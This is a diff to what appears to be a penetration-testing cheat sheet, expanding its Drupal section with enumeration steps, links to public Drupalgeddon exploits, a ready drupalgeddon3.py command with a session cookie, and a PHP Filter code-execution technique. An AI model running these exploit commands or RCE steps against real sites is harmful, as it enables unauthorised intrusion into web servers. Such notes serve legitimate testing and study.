@@ -1576,11 +1576,20 @@ Common API path convention: `/api_name/v1`
 ## Drupal
 
 - Enumerate version by seeing `/CHANGELOG.txt`
-- `droopescan scan drupal -u http://10.10.10.9`
+- Enumerate modules and search for specific vulnerabilities
+- Enumerate nodes with Burp Intruder and `https://drupal-target.io/node/§1§` to find hidden pages
+- `droopescan scan drupal -u https://drupal-target.io`
 
 Drupalgeddon
-- Check also Drupalgeddon2
-- `python drupalgeddon3.py http://10.10.10.9/ "SESSd873f26fc11f2b7e6e4aa0f6fce59913=GCGJfJI7t9GIIV7M7NLK8ARzeURzu83jxeqI2_qcDGs" 1 "whoami"`
+- [drupal_drupalgeddon2.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/drupal_drupalgeddon2.rb)
+- [Drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2)
+- [drupalgeddon3.py](https://github.com/oways/SA-CORE-2018-004)
+	- `python drupalgeddon3.py http://10.10.10.9/ "SESSd873f26fc11f2b7e6e4aa0f6fce59913=GCGJfJI7t9GIIV7M7NLK8ARzeURzu83jxeqI2_qcDGs" 1 "whoami"`
+
+Drupal 7.x and PHP Filter RCE
+- If the core module "PHP Filter" is enabled, it is possible to inject PHP code where you can submit content
+- If you are admin, you can create a new page with PHP code through `/node/add/page`
+
 
 
 ## Tomcat
